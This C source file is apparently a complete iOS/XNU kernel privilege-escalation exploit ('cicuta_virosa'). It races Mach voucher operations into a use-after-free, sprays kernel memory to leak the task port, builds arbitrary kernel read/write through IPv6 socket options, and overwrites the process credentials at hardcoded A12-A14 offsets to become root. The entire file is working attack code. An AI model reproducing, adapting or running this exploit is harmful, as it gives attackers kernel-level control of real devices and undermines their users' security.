#include <mach/mach.h>
#include <assert.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <errno.h>
#include "cicuta_virosa.h"
#include "voucher_utils.h"
#include "cicuta_log.h"
#include "descriptors_utils.h"
#include "fake_element_spray.h"
#include "exploit_utilities.h"

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

static kern_return_t extract_voucher_content(mach_port_t voucher, void* out, uint32_t* out_size)
{
    kern_return_t mach_voucher_extract_attr_content(ipc_voucher_t voucher, mach_voucher_attr_key_t key,
        mach_voucher_attr_content_t content, mach_msg_type_number_t *contentCnt);
    return mach_voucher_extract_attr_content(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, out, out_size);
}

static kern_return_t extract_voucher_recipes(mach_port_t voucher, void* out, uint32_t* out_size)
{
    kern_return_t
    mach_voucher_extract_all_attr_recipes(
        ipc_voucher_t                                   voucher,
        mach_voucher_attr_raw_recipe_array_t            recipes,
        mach_voucher_attr_raw_recipe_array_size_t       *in_out_size);
    return mach_voucher_extract_all_attr_recipes(voucher, out, out_size);
}

struct redeem_race_context
{
    mach_port_t target;
    uint32_t tries;
    int* start_flag;
};

struct element_uaf_race_context
{
    mach_port_t target;
    uint64_t id;
    int* start_flag;
    mach_voucher_attr_recipe_t recipe;
};

kern_return_t redeem_voucher(ipc_voucher_t target, ipc_voucher_t* result)
{
    mach_voucher_attr_recipe_data_t recipe = {
        .key = MACH_VOUCHER_ATTR_KEY_USER_DATA,
        .command = MACH_VOUCHER_ATTR_REDEEM,
        .previous_voucher = target
    };

    return create_voucher(&recipe, result);
}

static void* redeem_voucher_thread(void* context)
{
    volatile struct redeem_race_context* redeem_context = context;
    uint32_t tries = redeem_context->tries;
    ipc_voucher_t voucher = MACH_PORT_NULL;

    while (!*redeem_context->start_flag){}

    for (uint32_t i = 0; i < tries; ++i)
    {
        kern_return_t kr = redeem_voucher(redeem_context->target, &voucher);
        assert(kr == KERN_SUCCESS);
    }

    return NULL;
}

static void* destroy_voucher_thread(void* context)
{
    volatile struct element_uaf_race_context* uaf_context = context;
    ipc_voucher_t target = uaf_context->target;
    while (!*uaf_context->start_flag){}
    destroy_voucher(target);
    return NULL;
}

static void* create_voucher_thread(void* context)
{
    volatile struct element_uaf_race_context* uaf_context = context;
    mach_voucher_attr_recipe_t recipe = uaf_context->recipe;
    ipc_voucher_t* voucher = malloc(sizeof(ipc_voucher_t));
    *voucher = IPC_VOUCHER_NULL;
    while (!*uaf_context->start_flag){}
    assert(create_voucher(recipe, voucher) == KERN_SUCCESS);
    return voucher;
}

#define REDEEM_RACERS_COUNT 2
pthread_t* redeem_racers = NULL;

void perform_e_made_dropping_race(struct redeem_race_context* context)
{
    *context->start_flag = 0;
    for (int i = 0; i < REDEEM_RACERS_COUNT; ++i)
    {
        pthread_create(&redeem_racers[i], 0, redeem_voucher_thread, context);
    }

    *context->start_flag = 1;
    for (int i = 0; i < REDEEM_RACERS_COUNT; ++i)
    {
        pthread_join(redeem_racers[i], NULL);
    }
}

ipc_voucher_t perform_user_data_element_uaf_race(uint64_t id)
{
    struct element_uaf_race_context context;
    context.id = id;
    context.recipe = create_recipe_for_user_data_voucher(id);
    assert(create_voucher(context.recipe, &context.target) == KERN_SUCCESS);
    context.start_flag = malloc(sizeof(int));

    pthread_t destroy = NULL;
    pthread_t create = NULL;
    ipc_voucher_t* new_voucher  = NULL;
    uint64_t content[DATA_VOUCHER_CONTENT_SIZE / 8];
    uint32_t out_size = sizeof(content);

    for (uint32_t i = 1; i < 500; ++i)
    {
        *context.start_flag = 0;
        pthread_create(&destroy, 0, destroy_voucher_thread, &context);
        pthread_create(&create, 0, create_voucher_thread, &context);
        *context.start_flag = 1;
        pthread_join(destroy, NULL);
        pthread_join(create, (void**)&new_voucher);
        context.target = *new_voucher;
        free(new_voucher);
        kern_return_t kr = extract_voucher_content(context.target, content, &out_size);
        if (kr == 0x10000003)
        {
            assert(create_voucher(context.recipe, &context.target) == KERN_SUCCESS);
        }
        else if (kr == KERN_NO_SPACE || out_size != sizeof(content))
        {
            cicuta_log("perform_user_data_element_uaf_race: success on %u iteration", i);
            return context.target;
        }
    }

    destroy_voucher(context.target);
    return IPC_VOUCHER_NULL;
}


#define RW_SOCKETS 128
int rw_sockets[RW_SOCKETS];

static int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int kread_write_sock = - 1;

uint64_t read_64(uint64_t addr)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    uint64_t buf[3] = {0};
    get_pktinfo(kread_write_sock, (void*)buf);
    return buf[0];
}

uint32_t read_32(uint64_t addr)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    uint32_t buf[5] = {0};
    get_pktinfo(kread_write_sock, (void*)buf);
    return buf[0];
}

void write_20(uint64_t addr, const void* buf)
{
    fake_element_spray_set_pktopts(addr);
    perform_fake_element_spray();
    setsockopt(kread_write_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, 20);
}

void cicuta_virosa(void)
{
    int* race_flag = malloc(sizeof(int));
    struct redeem_race_context* context = malloc(sizeof(struct redeem_race_context));
    context->start_flag = race_flag;
    context->tries = 256;
    uint64_t id = 0;
    redeem_racers = calloc(1, REDEEM_RACERS_COUNT * sizeof(pthread_t));
    increase_limits(10240);

    cicuta_log("Stage 1: race for voucher ivace uaf");

init_exploit:
    init_fake_element_spray(0x1400 - 0x10, 1024);

stage1:
    create_user_data_voucher_fast(id, &context->target);
    for (uint32_t i = 0; i < 256; ++i)
    {
        perform_e_made_dropping_race(context);
    }

    ipc_voucher_t uafed_voucher = perform_user_data_element_uaf_race(id);
    if (uafed_voucher == IPC_VOUCHER_NULL)
    {
        ++id;
        goto stage1;
    }

    perform_fake_element_spray();
    cicuta_log("uafed_voucher: %u", uafed_voucher);
    cicuta_log("Stage 2: leak task port address and overlapped index");

    uint32_t recipe_size = 0x1400;
    uint32_t* recipe = malloc(recipe_size);

    if (extract_voucher_recipes(uafed_voucher, recipe, &recipe_size) != KERN_SUCCESS)
    {
        cicuta_log("Cannot extract fake element content!");
        release_all_fake_element_spray();
        free(recipe);
        goto init_exploit;
    }

    uint32_t* dump = recipe + 4;
    uint32_t spray_magic = FAKE_ELEMENT_MAGIC_BASE >> 32;
    if (recipe_size != 0x1400 || dump[1] != spray_magic)
    {
        cicuta_log("Bad fake element dump!");
        release_all_fake_element_spray();
        free(recipe);
        goto init_exploit;
    }

    cicuta_log("Got fake element dump!");
    uint32_t overlapped_index = dump[0];
    cicuta_log("Overlapped index: %u", overlapped_index);

    uint32_t* next_spray_entry = memmem(dump + 2, 0x1400 - 6 * sizeof(uint32_t), &spray_magic, sizeof(spray_magic));
    if (next_spray_entry == NULL)
    {
        cicuta_log("Cannot find next spray entry");
        release_all_fake_element_spray();
        free(recipe);
        goto init_exploit;
    }

    uint32_t next_spray_index = *(next_spray_entry - 1);
    cicuta_log("Next spray index: %u", next_spray_index);

#define OOL_PORTS_SPRAY 128

    mach_port_t* ports = malloc(OOL_PORTS_SPRAY * sizeof(mach_port_t));
    memset(ports, 0, OOL_PORTS_SPRAY * sizeof(mach_port_t));

    for(uint32_t i = 0; i < OOL_PORTS_SPRAY; ++i)
    {
        ports[i] = new_mach_port();
    }

    release_fake_element_spray_at(next_spray_index);
    for (uint32_t i = 0; i < OOL_PORTS_SPRAY; ++i)
    {
        send_ool_ports(ports[i], mach_task_self(), (DATA_VOUCHER_CONTENT_SIZE + USER_DATA_ELEMENT_SIZEOF) / sizeof(uint64_t), MACH_MSG_TYPE_COPY_SEND);
    }

    extract_voucher_recipes(uafed_voucher, recipe, &recipe_size);
    uint64_t task_port = *(uint64_t*)(next_spray_entry + 1);
    cicuta_log("task_port: 0x%llx", task_port);
    set_fake_queue_chain_for_fake_element_spray(task_port + offsetof(kport_t, ip_context) - 24, task_port + offsetof(kport_t, ip_context) - 16);

    cicuta_log("Stage 3: Convert uaf into pktopts uaf");
    ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
    for (uint32_t i = 1; i < 167777280; ++i)
    {
        assert(redeem_voucher(uafed_voucher, &redeemed_voucher) == KERN_SUCCESS);
    }

    cicuta_log("Respray fake user_data_element");
    fake_element_spray_set_e_size(DATA_VOUCHER_CONTENT_SIZE);
    perform_fake_element_spray();

    for (uint32_t i = 0; i < RW_SOCKETS; ++i)
    {
        rw_sockets[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    }

    cicuta_log("Destroy uafed voucher...");
    destroy_voucher(uafed_voucher);

    for (uint32_t i = 0; i < RW_SOCKETS; ++i)
    {
        int minmtu = -1;
        int res = setsockopt(rw_sockets[i], IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (res != 0)
        {
            cicuta_log("Cannot preallocate pktopts at %d. Error: %d", i, errno);
        }
    }

    fake_element_spray_set_pktopts(task_port + 0x68);
    perform_fake_element_spray();

    uint64_t buf[3] = {0};
    for (uint32_t i = 0; i < RW_SOCKETS; ++i)
    {
        get_pktinfo(rw_sockets[i], (void*)buf);
        if (buf[0] != 0)
        {
            kread_write_sock = rw_sockets[i];
            break;
        }
    }

    if (kread_write_sock == -1)
    {
        goto err;
    }

    cicuta_log("Established custom r/w primitives!");
    cicuta_log("Stage 4 (DEMO): pwn kernel");

// offsets is hardcoded for A12-14!!! Change it for your device!!!
    uint64_t task_pac = buf[0];
    cicuta_log("task PAC: 0x%llx", task_pac);
    uint64_t task = task_pac | 0xffffff8000000000;
    cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
    uint64_t proc_pac = read_64(task + 0x3A0);
    cicuta_log("proc PAC: 0x%llx", proc_pac);
    uint64_t proc = proc_pac | 0xffffff8000000000;
    cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
    uint64_t ucred_pac = read_64(proc + 0xf0);
    cicuta_log("ucred PAC: 0x%llx", ucred_pac);
    uint64_t ucred = ucred_pac | 0xffffff8000000000;
    cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred);

    cicuta_log("Overwriting kernel credentials :)");
    uint32_t creds[5] = {0, 0, 0, 1, 0};
    write_20(ucred + 0x18, (void*)creds);

    uint32_t uid = getuid();
    cicuta_log("getuid() returns %u", uid);
    cicuta_log("whoami: %s", uid == 0 ? "root" : "mobile");

err:
    free(redeem_racers);
    cicuta_log("Out.");
}
